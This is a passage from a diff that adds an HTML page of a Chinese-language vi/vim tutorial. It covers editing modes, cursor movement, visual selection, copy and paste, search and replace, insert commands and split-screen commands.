+</blockquote>
+<h3 id="12-vi-和-vim">1.2 vi 和 vim</h3>
+<ul>
+<li>在很多 <code>Linux</code> 发行版中，直接把 <code>vi</code> 做成 <code>vim</code> 的软连接</li>
+</ul>
+<h4 id="vi">vi</h4>
+<ul>
+<li><code>vi</code> 是 <code>Visual interface</code> 的简称，是 <code>Linux</code> 中 <strong>最经典</strong> 的文本编辑器</li>
+<li><code>vi</code> 的核心设计思想 —— <strong>让程序员的手指始终保持在键盘的核心区域，就能完成所有的编辑操作</strong></li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://MaHule.github.io/post-images/1586844627444.png" alt="001_vi键盘-w551" loading="lazy"></figure>
+<ul>
+<li><code>vi</code> 的特点：
+<ul>
+<li><strong>没有图形界面</strong> 的 <strong>功能强大</strong> 的编辑器</li>
+<li>只能是编辑 <strong>文本内容</strong>，不能对字体、段落进行排版</li>
+<li><strong>不支持鼠标操作</strong></li>
+<li><strong>没有菜单</strong></li>
+<li><strong>只有命令</strong></li>
+</ul>
+</li>
+<li><code>vi</code> 编辑器在 <strong>系统管理</strong>、<strong>服务器管理</strong> 编辑文件时，<strong>其功能永远不是图形界面的编辑器能比拟的</strong></li>
+</ul>
+<h4 id="vim"><code>vim</code></h4>
+<p><strong>vim = vi improved</strong></p>
+<ul>
+<li><code>vim</code> 是从 <code>vi</code> 发展出来的一个文本编辑器，支持 <strong>代码补全</strong>、<strong>编译</strong> 及 <strong>错误跳转</strong> 等方便编程的功能特别丰富，在程序员中被广泛使用，被称为 <strong>编辑器之神</strong></li>
+</ul>
+<h4 id="查询软连接命令知道">查询软连接命令（知道）</h4>
+<ul>
+<li>在很多 <code>Linux</code> 发行版中直接把 <code>vi</code> 做成 <code>vim</code> 的软连接</li>
+</ul>
+<pre><code class="language-bash"># 查找 vi 的运行文件
+
+$ which vi
+$ ls -l /usr/bin/vi
+$ ls -l /etc/alternatives/vi
+$ ls -l /usr/bin/vim.basic
+
+# 查找 vim 的运行文件
+$ which vim
+$ ls -l /usr/bin/vim
+$ ls -l /etc/alternatives/vim
+$ ls -l /usr/bin/vim.basic 
+</code></pre>
+<h2 id="02-打开和新建文件">02. 打开和新建文件</h2>
+<ul>
+<li>在终端中输入 <code>vi</code> <strong>在后面跟上文件名</strong> 即可</li>
+</ul>
+<pre><code class="language-bash">$ vi 文件名
+</code></pre>
+<ul>
+<li>如果文件已经存在，会直接打开该文件</li>
+<li>如果文件不存在，会新建一个文件</li>
+</ul>
+<h3 id="21-打开文件并且定位行">2.1 打开文件并且定位行</h3>
+<ul>
+<li>
+<p>在日常工作中，有可能会遇到 <strong>打开一个文件，并定位到指定行</strong> 的情况</p>
+</li>
+<li>
+<p>例如：在开发时，<strong>知道某一行代码有错误</strong>，可以 <strong>快速定位</strong> 到出错代码的位置</p>
+</li>
+<li>
+<p>这个时候，可以使用以下命令打开文件</p>
+</li>
+</ul>
+<pre><code class="language-bash">$ vi 文件名 +行数
+</code></pre>
+<blockquote>
+<p>提示：如果只带上 <code>+</code> 而不指定行号，会直接定位到文件末尾</p>
+</blockquote>
+<h3 id="22-异常处理">2.2 异常处理</h3>
+<ul>
+<li>如果 <code>vi</code> 异常退出，在磁盘上可能会保存有 <strong>交换文件</strong></li>
+<li>下次再使用 <code>vi</code> 编辑该文件时，会看到以下屏幕信息，按下字母 <code>d</code> 可以 <strong>删除交换文件</strong> 即可</li>
+</ul>
+<blockquote>
+<p>提示：按下键盘时，注意关闭输入法</p>
+</blockquote>
+<figure data-type="image" tabindex="2"><img src="https://MaHule.github.io/post-images/vi/002_vi_delete.png" alt="002_删除交换文件-w1048" loading="lazy"></figure>
+<h2 id="03-三种工作模式">03. 三种工作模式</h2>
+<ul>
+<li>
+<p><code>vi</code> 有三种基本工作模式：</p>
+<ol>
+<li><strong>命令模式</strong>
+<ul>
+<li><strong>打开文件首先进入命令模式</strong>，是使用 <code>vi</code> 的 <strong>入口</strong></li>
+<li>通过 <strong>命令</strong> 对文件进行常规的编辑操作，例如：<strong>定位</strong>、<strong>翻页</strong>、<strong>复制</strong>、<strong>粘贴</strong>、<strong>删除</strong>……</li>
+<li>在其他图形编辑器下，通过 <strong>快捷键</strong> 或者 <strong>鼠标</strong> 实现的操作，都在 <strong>命令模式</strong> 下实现</li>
+</ul>
+</li>
+<li><strong>末行模式</strong> —— 执行 <strong>保存</strong>、<strong>退出</strong> 等操作
+<ul>
+<li>要退出 <code>vi</code> 返回到控制台，需要在末行模式下输入命令</li>
+<li><strong>末行模式</strong> 是 <code>vi</code> 的 <strong>出口</strong></li>
+</ul>
+</li>
+<li><strong>编辑模式</strong> —— 正常的编辑文字</li>
+</ol>
+</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://MaHule.github.io/post-images/vi/003_vi_model.png" alt="003_vi的模式-w500" loading="lazy"></figure>
+<blockquote>
+<p>提示：在 <code>Touch Bar</code> 的 Mac 电脑上 ，按 <code>ESC</code> 不方便，可以使用 <code>CTRL + [</code> 替代</p>
+</blockquote>
+<h3 id="末行模式命令">末行模式命令</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">w</td>
+<td style="text-align:center">write</td>
+<td>保存</td>
+</tr>
+<tr>
+<td style="text-align:center">q</td>
+<td style="text-align:center">quit</td>
+<td>退出，如果没有保存，不允许退出</td>
+</tr>
+<tr>
+<td style="text-align:center">q!</td>
+<td style="text-align:center">quit</td>
+<td>强行退出，不保存退出</td>
+</tr>
+<tr>
+<td style="text-align:center">wq</td>
+<td style="text-align:center">write &amp; quit</td>
+<td>保存并退出</td>
+</tr>
+<tr>
+<td style="text-align:center">x</td>
+<td style="text-align:center"></td>
+<td>保存并退出</td>
+</tr>
+</tbody>
+</table>
+<h2 id="04-常用命令">04. 常用命令</h2>
+<h3 id="命令线路图">命令线路图</h3>
+<ol start="0">
+<li>重复次数
+<ul>
+<li>在命令模式下，<strong>先输入一个数字</strong>，<strong>再跟上一个命令</strong>，可以让该命令 <strong>重复执行指定次数</strong></li>
+</ul>
+</li>
+<li>移动和选择（<strong>多练</strong>）
+<ul>
+<li><code>vi</code> 之所以快，关键在于 <strong>能够快速定位到要编辑的代码行</strong></li>
+<li><strong>移动命令</strong> 能够 和 <strong>编辑操作</strong> 命令 <strong>组合使用</strong></li>
+</ul>
+</li>
+<li>编辑操作
+<ul>
+<li><strong>删除</strong>、<strong>复制</strong>、<strong>粘贴</strong>、<strong>替换</strong>、<strong>缩排</strong></li>
+</ul>
+</li>
+<li>撤销和重复</li>
+<li>查找替换</li>
+<li>编辑</li>
+</ol>
+<h4 id="学习提示">学习提示</h4>
+<ol>
+<li><code>vi</code> 的命令较多，<strong>不要期望一下子全部记住</strong>，个别命令忘记了，只是会影响编辑速度而已</li>
+<li>在使用 <code>vi</code> 命令时，注意 <strong>关闭中文输入法</strong></li>
+</ol>
+<h3 id="41-移动基本">4.1 移动（基本）</h3>
+<ul>
+<li>要熟练使用 <code>vi</code>，首先应该学会怎么在 <strong>命令模式</strong> 下样快速移动光标</li>
+<li><strong>编辑操作命令</strong>，能够和 <strong>移动命令</strong> 结合在一起使用</li>
+</ul>
+<h4 id="1-上-下-左-右">1) 上、下、左、右</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th>功能</th>
+<th style="text-align:center">手指</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">h</td>
+<td>向左</td>
+<td style="text-align:center">食指</td>
+</tr>
+<tr>
+<td style="text-align:center">j</td>
+<td>向下</td>
+<td style="text-align:center">食指</td>
+</tr>
+<tr>
+<td style="text-align:center">k</td>
+<td>向上</td>
+<td style="text-align:center">中指</td>
+</tr>
+<tr>
+<td style="text-align:center">l</td>
+<td>向右</td>
+<td style="text-align:center">无名指</td>
+</tr>
+</tbody>
+</table>
+<figure data-type="image" tabindex="4"><img src="https://MaHule.github.io/post-images/vi/005_vi_move.png" alt="005_移动光标-w551" loading="lazy"></figure>
+<h4 id="2-行内移动">2) 行内移动</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">w</td>
+<td style="text-align:center">word</td>
+<td>向后移动一个单词</td>
+</tr>
+<tr>
+<td style="text-align:center">b</td>
+<td style="text-align:center">back</td>
+<td>向前移动一个单词</td>
+</tr>
+<tr>
+<td style="text-align:center">0</td>
+<td style="text-align:center"></td>
+<td>行首</td>
+</tr>
+<tr>
+<td style="text-align:center">^</td>
+<td style="text-align:center"></td>
+<td>行首，第一个不是空白字符的位置</td>
+</tr>
+<tr>
+<td style="text-align:center">$</td>
+<td style="text-align:center"></td>
+<td>行尾</td>
+</tr>
+</tbody>
+</table>
+<h4 id="3-行数移动">3) 行数移动</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">gg</td>
+<td style="text-align:center">go</td>
+<td>文件顶部</td>
+</tr>
+<tr>
+<td style="text-align:center">G</td>
+<td style="text-align:center">go</td>
+<td>文件末尾</td>
+</tr>
+<tr>
+<td style="text-align:center">数字gg</td>
+<td style="text-align:center">go</td>
+<td>移动到 数字 对应行数</td>
+</tr>
+<tr>
+<td style="text-align:center">数字G</td>
+<td style="text-align:center">go</td>
+<td>移动到 数字 对应行数</td>
+</tr>
+<tr>
+<td style="text-align:center">:数字</td>
+<td style="text-align:center"></td>
+<td>移动到 数字 对应行数</td>
+</tr>
+</tbody>
+</table>
+<h4 id="4-屏幕移动">4) 屏幕移动</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Ctrl + b</td>
+<td style="text-align:center">back</td>
+<td>向上翻页</td>
+</tr>
+<tr>
+<td style="text-align:center">Ctrl + f</td>
+<td style="text-align:center">forward</td>
+<td>向下翻页</td>
+</tr>
+<tr>
+<td style="text-align:center">H</td>
+<td style="text-align:center">Head</td>
+<td>屏幕顶部</td>
+</tr>
+<tr>
+<td style="text-align:center">M</td>
+<td style="text-align:center">Middle</td>
+<td>屏幕中间</td>
+</tr>
+<tr>
+<td style="text-align:center">L</td>
+<td style="text-align:center">Low</td>
+<td>屏幕底部</td>
+</tr>
+</tbody>
+</table>
+<h3 id="42-移动程序">4.2 移动（程序）</h3>
+<h4 id="1-段落移动">1) 段落移动</h4>
+<ul>
+<li><code>vi</code> 中使用 空行 来区分段落</li>
+<li>在程序开发时，通常 <strong>一段功能相关的代码会写在一起</strong> —— 之间没有空行</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">{</td>
+<td>上一段</td>
+</tr>
+<tr>
+<td style="text-align:center">}</td>
+<td>下一段</td>
+</tr>
+</tbody>
+</table>
+<h4 id="2-括号切换">2) 括号切换</h4>
+<ul>
+<li>在程序世界中，<code>()</code>、<code>[]</code>、<code>{}</code> 使用频率很高，而且 <strong>都是成对出现的</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">%</td>
+<td>括号匹配及切换</td>
+</tr>
+</tbody>
+</table>
+<h4 id="3-标记">3) 标记</h4>
+<ul>
+<li>在开发时，某一块代码可能<strong>需要稍后处理</strong>，例如：编辑、查看</li>
+<li>此时先使用 <code>m</code> 增加一个标记，这样可以 <strong>在需要时快速地跳转回来</strong> 或者 <strong>执行其他编辑操作</strong></li>
+<li><strong>标记名称</strong> 可以是 <code>a~z</code> 或者 <code>A~Z</code> 之间的任意 <strong>一个</strong> 字母</li>
+<li>添加了标记的 <strong>行如果被删除</strong>，<strong>标记同时被删除</strong></li>
+<li>如果 <strong>在其他行添加了相同名称的标记</strong>，<strong>之前添加的标记也会被替换掉</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">mx</td>
+<td style="text-align:center">mark</td>
+<td>添加标记 x，x 是 a~z 或者 A~Z 之间的任意一个字母</td>
+</tr>
+<tr>
+<td style="text-align:center">'x</td>
+<td style="text-align:center"></td>
+<td>直接定位到标记 x 所在位置</td>
+</tr>
+</tbody>
+</table>
+<h3 id="43-选中文本可视模式">4.3 选中文本（可视模式）</h3>
+<ul>
+<li>学习 <code>复制</code> 命令前，应该先学会 <strong>怎么样选中 要复制的代码</strong></li>
+<li>在 <code>vi</code> 中要选择文本，需要先使用 <code>Visual</code> 命令切换到 <strong>可视模式</strong></li>
+<li><code>vi</code> 中提供了 <strong>三种</strong> 可视模式，可以方便程序员选择 <strong>选中文本的方式</strong></li>
+<li>按 <code>ESC</code> 可以放弃选中，返回到 <strong>命令模式</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th>模式</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">v</td>
+<td>可视模式</td>
+<td>从光标位置开始按照正常模式选择文本</td>
+</tr>
+<tr>
+<td style="text-align:center">V</td>
+<td>可视行模式</td>
+<td>选中光标经过的完整行</td>
+</tr>
+<tr>
+<td style="text-align:center">Ctrl + v</td>
+<td>可视块模式</td>
+<td>垂直方向选中文本</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>可视模式</strong>下，可以和 <strong>移动命令</strong> 连用，例如：<code>ggVG</code> 能够选中所有内容</li>
+</ul>
+<h3 id="44-撤销和恢复撤销">4.4 撤销和恢复撤销</h3>
+<ul>
+<li>在学习编辑命令之前，先要知道怎样撤销之前一次 <strong>错误的</strong> 编辑动作！</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">u</td>
+<td style="text-align:center">undo</td>
+<td>撤销上次命令</td>
+</tr>
+<tr>
+<td style="text-align:center">CTRL + r</td>
+<td style="text-align:center">redo</td>
+<td>恢复撤销的命令</td>
+</tr>
+</tbody>
+</table>
+<h3 id="45-删除文本">4.5 删除文本</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">x</td>
+<td style="text-align:center">cut</td>
+<td>删除光标所在字符，或者选中文字</td>
+</tr>
+<tr>
+<td style="text-align:center">d(移动命令)</td>
+<td style="text-align:center">delete</td>
+<td>删除移动命令对应的内容</td>
+</tr>
+<tr>
+<td style="text-align:center">dd</td>
+<td style="text-align:center">delete</td>
+<td>删除光标所在行，可以 ndd 复制多行</td>
+</tr>
+<tr>
+<td style="text-align:center">D</td>
+<td style="text-align:center">delete</td>
+<td>删除至行尾</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>提示：如果使用 <strong>可视模式</strong> 已经选中了一段文本，那么无论使用 <code>d</code> 还是 <code>x</code>，都可以删除选中文本</p>
+</blockquote>
+<ul>
+<li>删除命令可以和 <strong>移动命令</strong> 连用，以下是常见的组合命令：</li>
+</ul>
+<pre><code>* dw        # 从光标位置删除到单词末尾
+* d0        # 从光标位置删除到一行的起始位置
+* d}        # 从光标位置删除到段落结尾
+* ndd       # 从光标位置向下连续删除 n 行
+* d代码行G   # 从光标所在行 删除到 指定代码行 之间的所有代码
+* d'a       # 从光标所在行 删除到 标记a 之间的所有代码
+</code></pre>
+<h3 id="46-复制-粘贴">4.6 复制、粘贴</h3>
+<ul>
+<li><code>vi</code> 中提供有一个 <strong>被复制文本的缓冲区</strong>
+<ul>
+<li><strong>复制</strong> 命令会将选中的文字保存在缓冲区</li>
+<li><strong>删除</strong> 命令删除的文字会被保存在缓冲区</li>
+<li>在需要的位置，使用 <strong>粘贴</strong> 命令可以将缓冲区的文字插入到光标所在位置</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">y(移动命令)</td>
+<td style="text-align:center">copy</td>
+<td>复制</td>
+</tr>
+<tr>
+<td style="text-align:center">yy</td>
+<td style="text-align:center">copy</td>
+<td>复制一行，可以 nyy 复制多行</td>
+</tr>
+<tr>
+<td style="text-align:center">p</td>
+<td style="text-align:center">paste</td>
+<td>粘贴</td>
+</tr>
+</tbody>
+</table>
+<p><strong>提示</strong></p>
+<ul>
+<li>命令 <code>d</code>、<code>x</code> 类似于图形界面的 <strong>剪切操作</strong> —— <code>CTRL + X</code></li>
+<li>命令 <code>y</code> 类似于图形界面的 <strong>复制操作</strong> —— <code>CTRL + C</code></li>
+<li>命令 <code>p</code> 类似于图形界面的 <strong>粘贴操作</strong> —— <code>CTRL + V</code></li>
+<li><code>vi</code> 中的 <strong>文本缓冲区同样只有一个</strong>，如果后续做过 <strong>复制、剪切</strong> 操作，之前缓冲区中的内容会被替换</li>
+</ul>
+<p><strong>注意</strong></p>
+<ul>
+<li><code>vi</code> 中的 <strong>文本缓冲区</strong> 和系统的 <strong>剪贴板</strong> 不是同一个</li>
+<li>所以在其他软件中使用 <code>CTRL + C</code> 复制的内容，不能在 <code>vi</code> 中通过 <code>P</code> 命令粘贴</li>
+<li>可以在 <strong>编辑模式</strong> 下使用 <strong>鼠标右键粘贴</strong></li>
+</ul>
+<h3 id="47-替换">4.7 替换</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+<th>工作模式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">r</td>
+<td style="text-align:center">replace</td>
+<td>替换当前字符</td>
+<td>命令模式</td>
+</tr>
+<tr>
+<td style="text-align:center">R</td>
+<td style="text-align:center">replace</td>
+<td>替换当前行光标后的字符</td>
+<td>替换模式</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><code>R</code> 命令可以进入 <strong>替换模式</strong>，替换完成后，按下 <code>ESC</code> 可以回到 <strong>命令模式</strong></li>
+<li><strong>替换命令</strong> 的作用就是不用进入 <strong>编辑模式</strong>，对文件进行 <strong>轻量级的修改</strong></li>
+</ul>
+<h3 id="48-缩排和重复执行">4.8 缩排和重复执行</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">&gt;&gt;</td>
+<td>向右增加缩进</td>
+</tr>
+<tr>
+<td style="text-align:center">&lt;&lt;</td>
+<td>向左减少缩进</td>
+</tr>
+<tr>
+<td style="text-align:center">.</td>
+<td>重复上次命令</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>缩排命令</strong> 在开发程序时，<strong>统一增加代码的缩进</strong> 比较有用！
+<ul>
+<li>一次性 <strong>在选中代码前增加 4 个空格</strong>，就叫做 <strong>增加缩进</strong></li>
+<li>一次性 <strong>在选中代码前删除 4 个空格</strong>，就叫做 <strong>减少缩进</strong></li>
+</ul>
+</li>
+<li>在 <strong>可视模式</strong> 下，缩排命令只需要使用 <strong>一个</strong> <code>&gt;</code> 或者 <code>&lt;</code></li>
+</ul>
+<blockquote>
+<p>在程序中，<strong>缩进</strong> 通常用来表示代码的归属关系</p>
+<ul>
+<li>前面空格越少，代码的级别越高</li>
+<li>前面空格越多，代码的级别越低</li>
+</ul>
+</blockquote>
+<h3 id="49-查找">4.9 查找</h3>
+<h4 id="常规查找">常规查找</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">/str</td>
+<td>查找 str</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>查找到指定内容之后，使用 <code>Next</code> 查找下一个出现的位置：
+<ul>
+<li><code>n</code>: 查找下一个</li>
+<li><code>N</code>: 查找上一个</li>
+</ul>
+</li>
+<li>如果不想看到高亮显示，可以随便查找一个文件中不存在的内容即可</li>
+</ul>
+<h4 id="单词快速匹配">单词快速匹配</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">*</td>
+<td>向后查找当前光标所在单词</td>
+</tr>
+<tr>
+<td style="text-align:center">#</td>
+<td>向前查找当前光标所在单词</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>在开发中，通过单词快速匹配，可以快速看到这个单词在其他什么位置使用过</li>
+</ul>
+<h3 id="410-查找并替换">4.10 查找并替换</h3>
+<ul>
+<li>在 <code>vi</code> 中查找和替换命令需要在 <strong>末行模式</strong> 下执行</li>
+<li>记忆命令格式：</li>
+</ul>
+<pre><code>:%s///g
+</code></pre>
+<h4 id="1-全局替换">1) 全局替换</h4>
+<ul>
+<li><strong>一次性</strong>替换文件中的 <strong>所有出现的旧文本</strong></li>
+<li>命令格式如下：</li>
+</ul>
+<pre><code>:%s/旧文本/新文本/g
+</code></pre>
+<h4 id="2-可视区域替换">2) 可视区域替换</h4>
+<ul>
+<li><strong>先选中</strong> 要替换文字的 <strong>范围</strong></li>
+<li>命令格式如下：</li>
+</ul>
+<pre><code>:s/旧文本/新文本/g
+</code></pre>
+<h4 id="3-确认替换">3) 确认替换</h4>
+<ul>
+<li>如果把末尾的 <code>g</code> 改成 <code>gc</code> 在替换的时候，会有提示！<strong>推荐使用！</strong></li>
+</ul>
+<pre><code>:%s/旧文本/新文本/gc
+</code></pre>
+<ol>
+<li><code>y</code> - <code>yes</code> 替换</li>
+<li><code>n</code> - <code>no</code> 不替换</li>
+<li><code>a</code> - <code>all</code> 替换所有</li>
+<li><code>q</code> - <code>quit</code> 退出替换</li>
+<li><code>l</code> - <code>last</code> 最后一个，并把光标移动到行首</li>
+<li><code>^E</code> 向下滚屏</li>
+<li><code>^Y</code> 向上滚屏</li>
+</ol>
+<h3 id="411-插入命令">4.11 插入命令</h3>
+<ul>
+<li>在 <code>vi</code> 中除了常用的 <code>i</code> 进入 <strong>编辑模式</strong> 外，还提供了以下命令同样可以进入编辑模式：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+<th style="text-align:center">常用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">i</td>
+<td style="text-align:center">insert</td>
+<td>在当前字符前插入文本</td>
+<td style="text-align:center">常用</td>
+</tr>
+<tr>
+<td style="text-align:center">I</td>
+<td style="text-align:center">insert</td>
+<td>在行首插入文本</td>
+<td style="text-align:center">较常用</td>
+</tr>
+<tr>
+<td style="text-align:center">a</td>
+<td style="text-align:center">append</td>
+<td>在当前字符后添加文本</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">A</td>
+<td style="text-align:center">append</td>
+<td>在行末添加文本</td>
+<td style="text-align:center">较常用</td>
+</tr>
+<tr>
+<td style="text-align:center">o</td>
+<td style="text-align:center"></td>
+<td>在当前行后面插入一空行</td>
+<td style="text-align:center">常用</td>
+</tr>
+<tr>
+<td style="text-align:center">O</td>
+<td style="text-align:center"></td>
+<td>在当前行前面插入一空行</td>
+<td style="text-align:center">常用</td>
+</tr>
+</tbody>
+</table>
+<figure data-type="image" tabindex="5"><img src="https://MaHule.github.io/post-images/vi/004_vi_insert.png" alt="004_插入命令-w400" loading="lazy"></figure>
+<h4 id="演练-1-编辑命令和数字连用">演练 1 —— 编辑命令和数字连用</h4>
+<ul>
+<li>在开发中，可能会遇到连续输入 <code>N</code> 个同样的字符</li>
+</ul>
+<blockquote>
+<p>在 <code>Python</code> 中有简单的方法，但是其他语言中通常需要自己输入</p>
+</blockquote>
+<ul>
+<li>例如：<code>**********</code> 连续 10 个星号</li>
+</ul>
+<p>要实现这个效果可以在 <strong>命令模式</strong> 下</p>
+<ol>
+<li>输入 <code>10</code>，表示要重复 10 次</li>
+<li>输入 <code>i</code> 进入 <strong>编辑模式</strong></li>
+<li>输入 <code>*</code> 也就是重复的文字</li>
+<li>按下 <code>ESC</code> 返回到 <strong>命令模式</strong>，返回之后 <code>vi</code> 就会把第 <code>2、3</code> 两步的操作重复 <code>10</code> 次</li>
+</ol>
+<blockquote>
+<p>提示：正常开发时，在 <strong>进入编辑模式之前，不要按数字</strong></p>
+</blockquote>
+<h4 id="演练-2-利用-可视块-给多行代码增加注释">演练 2 —— 利用 可视块 给多行代码增加注释</h4>
+<ul>
+<li>在开发中，可能会遇到一次性给多行代码 <strong>增加注释</strong> 的情况</li>
+</ul>
+<blockquote>
+<p>在 <code>Python</code> 中，要给代码增加注释，可以在代码前增加一个 <code># </code></p>
+</blockquote>
+<p>要实现这个效果可以在 <strong>命令模式</strong> 下</p>
+<ol>
+<li>移动到要添加注释的 <strong>第 1 行代码</strong>，按 <code>^</code> 来到行首</li>
+<li>按 <code>CTRL + v</code> 进入 <strong>可视块</strong> 模式</li>
+<li>使用 <code>j</code> 向下连续选中要添加的代码行</li>
+<li>输入 <code>I</code> 进入 <strong>编辑模式</strong>，并在 <strong>行首插入</strong>，注意：一定要使用 <strong>I</strong></li>
+<li>输入 <code># </code> 也就是注释符号</li>
+<li>按下 <code>ESC</code> 返回到 <strong>命令模式</strong>，返回之后 <code>vi</code> 会在之前选中的每一行代码 <strong>前</strong> 插入 <code># </code></li>
+</ol>
+<h2 id="05-分屏命令">05. 分屏命令</h2>
+<ul>
+<li>属于 <code>vi</code> 的高级命令 —— 可以 <strong>同时编辑和查看多个文件</strong></li>
+</ul>
+<h3 id="51-末行命令扩展">5.1 末行命令扩展</h3>
+<p><strong>末行命令</strong> 主要是针对文件进行操作的：<strong>保存</strong>、<strong>退出</strong>、<strong>保存&amp;退出</strong>、<strong>搜索&amp;替换</strong>、<strong>另存</strong>、<strong>新建</strong>、<strong>浏览文件</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">:e .</td>
+<td style="text-align:center">edit</td>
+<td>会打开内置的文件浏览器，浏览要当前目录下的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">:n 文件名</td>
+<td style="text-align:center">new</td>
+<td>新建文件</td>
+</tr>
+<tr>
+<td style="text-align:center">:w 文件名</td>
+<td style="text-align:center">write</td>
+<td>另存为，但是仍然编辑当前文件，并不会切换文件</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>提示：切换文件之前，必须保证当前这个文件已经被保存！</p>
+</blockquote>
+<ul>
+<li>已经学习过的 <strong>末行命令</strong>：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">:w</td>
+<td style="text-align:center">write</td>
+<td>保存</td>
+</tr>
+<tr>
+<td style="text-align:center">:q</td>
+<td style="text-align:center">quit</td>
+<td>退出，如果没有保存，不允许退出</td>
+</tr>
+<tr>
+<td style="text-align:center">:q!</td>
+<td style="text-align:center">quit</td>
+<td>强行退出，不保存退出</td>
+</tr>
+<tr>
+<td style="text-align:center">:wq</td>
+<td style="text-align:center">write &amp; quit</td>
+<td>保存并退出</td>
+</tr>
+<tr>
+<td style="text-align:center">:x</td>
+<td style="text-align:center"></td>
+<td>保存并退出</td>
+</tr>
+<tr>
+<td style="text-align:center">:%s///gc</td>
+<td style="text-align:center"></td>
+<td>确认搜索并替换</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>在实际开发中，可以使用 <code>w</code> 命令 <strong>阶段性的备份代码</strong></p>
+</blockquote>
+<h3 id="52-分屏命令">5.2 分屏命令</h3>
+<ul>
+<li>使用 <strong>分屏命令</strong>，可以 <strong>同时编辑和查看多个文件</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">:sp [文件名]</td>
+<td style="text-align:center">split</td>
+<td>横向增加分屏</td>
+</tr>
+<tr>
+<td style="text-align:center">:vsp [文件名]</td>
+<td style="text-align:center">vertical split</td>
+<td>纵向增加分屏</td>
+</tr>
+</tbody>
+</table>
+<h4 id="1-切换分屏窗口">1) 切换分屏窗口</h4>
+<blockquote>
+<p>分屏窗口都是基于 <code>CTRL + W</code> 这个快捷键的，<code>w</code> 对应的英文单词是 <code>window</code></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">w</td>
+<td style="text-align:center">window</td>
+<td>切换到下一个窗口</td>
+</tr>
+<tr>
+<td style="text-align:center">r</td>
+<td style="text-align:center">reverse</td>
+<td>互换窗口</td>
+</tr>
+<tr>
+<td style="text-align:center">c</td>
+<td style="text-align:center">close</td>
+<td>关闭当前窗口，但是不能关闭最后一个窗口</td>
+</tr>
+<tr>
